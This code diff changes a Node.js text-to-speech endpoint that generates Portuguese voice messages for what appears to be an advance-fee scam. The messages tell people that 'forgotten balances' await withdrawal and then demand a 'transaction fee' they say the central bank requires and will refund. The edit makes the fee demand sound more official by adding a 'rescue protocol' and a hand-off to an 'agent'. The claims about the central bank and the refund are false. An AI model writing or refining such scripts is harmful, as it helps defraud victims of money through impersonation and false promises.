@@ -795,7 +795,7 @@ app.post("/api/v1/tts", async (req, res) => {
     let text = `Olá ${firstName}, aqui é a ${agente}, a atendente responsável pelo seu caso. Parabéns! A sua solicitação de saque foi aprovada, no valor de ${value}, referentes a saldos esquecidos. Assista ao vídeo abaixo, para entender como realizar o saque.`;
     
     if (type === 'taxa') {
-      text = `Aqui é a ${agente} novamente. Para que o seu saque seja liberado imediatamente, é necessário realizar o pagamento da tarifa transacional. Esse valor é cobrado pelo banco central, para cobrir os custos de transferência bancária, mas não se preocupe, essa taxa será devolvida junto com o seu saque de ${value}.`;
+      text = `Aqui é a ${agente} novamente. Para que o seu saque seja liberado imediatamente, é necessário realizar o pagamento do protocolo de resgate da tarifa transacional. Este valor é uma exigência do banco central para cobrir os custos de transferência bancária. Ressaltamos que, assim que o protocolo for pago, o seu valor de ${value} será totalmente liberado para a conclusão e transferência com o nosso agente de atendimento. Não se preocupe, o valor da tarifa será devolvido junto com o seu saque.`;
     } else if (type === 'final') {
       text = `Aqui é a ${agente}. Parabéns, ${firstName}. O seu pagamento foi confirmado com sucesso! O seu valor de ${value} já está garantido. Agora, falta apenas a última etapa: a liberação com um agente oficial. Por favor, clique no botão abaixo para falar com o nosso atendimento e concluir a sua transferência.`;
     }
